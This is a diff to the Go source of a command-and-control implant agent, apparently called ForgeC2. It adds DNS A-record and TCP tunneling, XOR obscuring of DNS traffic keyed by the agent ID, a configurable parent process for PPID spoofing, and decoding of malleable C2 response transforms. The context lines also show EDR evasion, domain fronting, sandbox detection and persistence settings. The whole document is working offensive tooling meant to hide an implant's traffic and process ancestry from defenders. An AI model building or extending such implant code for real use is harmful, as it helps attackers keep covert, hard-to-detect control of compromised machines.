@@ -44,6 +44,9 @@ var (
 	DNSDoHURL               string            = ""                            // DNS-over-HTTPS endpoint (e.g. "https://dns.google/dns-query")
 	DNSDoTAddr              string            = ""                            // DNS-over-TLS address:port (e.g. "1.1.1.1:853")
 	DNSIPv6                 bool              = false                         // enable IPv6 AAAA record tunneling
+	DNSARecordTunnel        bool              = false                         // enable A-record tunneling (response payload packed into 4-byte A rdata)
+	DNSTCP                  bool              = false                         // send DNS queries over TCP (RFC 1035 length-prefixed) instead of UDP
+	DNSObscure              bool              = false                         // XOR-obscure DNS fragments/responses keyed by the agent UUID
 	ProxyStr                string            = ""                            // HTTP proxy URL (e.g. "http://proxy:8080")
 	CryptoKeyStr            string            = ""                            // 32-byte hex key for beacon payload encryption ("" = disabled)
 	BeaconKeyStr            string            = ""                            // pre-shared key used to derive registration auth ("" = no PSK auth)
@@ -53,13 +56,20 @@ var (
 	DomainFront             string            = ""                            // Domain fronting: override HTTP Host header ("" = disabled)
 	ContentLengthJitter     int               = 0                             // Max random padding bytes for HTTP body (0=disabled)
 	MalleablePrepend        string            = ""                            // bytes prepended to every HTTP beacon response body (server malleable profile)
+	// MalleableRespDecode holds the serialized output transforms (e.g.
+	// "base64;xor:microsoft") of the server's malleable profile. When non-empty
+	// the agent reverses them on every HTTP beacon response so the encrypted
+	// envelope can be recovered (without it the profile-preset C2 pipeline is
+	// dead for the live agent). Delivered over-the-wire when a profile is set.
+	MalleableRespDecode string = ""
 	MalleableAppend         string            = ""                            // bytes appended to every HTTP beacon response body (server malleable profile)
 	MalleableRequestPrepend string            = ""                            // bytes prepended to the agent's OUTGOING HTTP beacon body (server strips on inbound)
 	MalleableRequestAppend  string            = ""                            // bytes appended to the agent's OUTGOING HTTP beacon body (server strips on inbound)
 	MalleableRequestHeaders map[string]string = nil                           // extra request headers sent on outbound beacons (e.g. Host/Cookie shaping)
 	ExpiryDateStr           string            = ""                            // Compile-time expiry date: "YYYY-MM-DD" — implant auto-exits after this date
 	EvasionStr              string            = "false"                       // Compile-time EDR evasion (chunked sleep); also FORGEC2_EVASION=1 at runtime
-	PPIDSpoofStr            string            = "false"                       // Compile-time PPID spoofing (spawned processes inherit explorer.exe as parent)
+	PPIDSpoofStr            string            = "false"                       // Compile-time PPID spoofing (spawned processes inherit the configured parent as parent)
+	PPIDSpoofParent         string            = "explorer.exe"                // Parent process name used for PPID spoofing (e.g. explorer.exe, svchost.exe, runtimebroker.exe)
 	PersistencePrefixStr    string            = ""                            // Custom prefix for persistence artifacts (reg keys, task names, file names); default "ForgeC2"
 	BeaconTransportStr      string            = "http"                        // "http", "wss", "ssh" — transport protocol for beacon
 	ChameleonStr            string            = "true"                        // enable uTLS TLS fingerprint randomization (requires chameleon build tag)
@@ -130,6 +140,7 @@ var (
 var ecdhSess *ecdhSession    // ECDH session for forward-secret encryption (nil = not established)
 var inSandbox bool           // set by sandbox detection at startup
 var ppidSpoofEnabled bool    // PPID spoofing enabled via ldfags
+var ppidSpoofParent string   // parent process name used for PPID spoofing
 var persistencePrefix string // artifact name prefix for persistence (default "ForgeC2")
 var egressDetection bool     // parsed from EgressDetectionStr
 var AgentVersion = s(SAgentVersion)
@@ -190,6 +201,9 @@ type agentConfigBlob struct {
 	SelfCheckSHA256  string `json:"self_check"`
 	MalleablePrepend string `json:"malleable_prepend"`
 	MalleableAppend  string `json:"malleable_append"`
+	// MalleableRespDecode is the over-the-wire form of the server's profile
+	// output transforms; non-empty when a malleable profile preset is active.
+	MalleableRespDecode string `json:"malleable_resp_decode"`
 	// Request-side transforms applied by the agent to outbound beacons.
 	MalleableRequestPrepend string            `json:"malleable_request_prepend"`
 	MalleableRequestAppend  string            `json:"malleable_request_append"`
@@ -303,6 +317,7 @@ func applyServerNetworkConfig(b64 string) {
 		DomainFront:      nc.DomainFront,
 		MalleablePrepend: nc.MalleablePrepend,
 		MalleableAppend:  nc.MalleableAppend,
+		MalleableRespDecode: nc.MalleableRespDecode,
 		BeaconURI:        nc.BeaconURI,
 	}
 	if nc.RequestPrepend != "" {
@@ -477,6 +492,10 @@ func (b *agentConfigBlob) apply() {
 	}
 	if b.MalleableAppend != "" {
 		MalleableAppend = b.MalleableAppend
+	}
+	if b.MalleableRespDecode != "" {
+		MalleableRespDecode = b.MalleableRespDecode
+		reparseMalleableTransforms()
 	}
 	if b.MalleableRequestPrepend != "" {
 		MalleableRequestPrepend = b.MalleableRequestPrepend
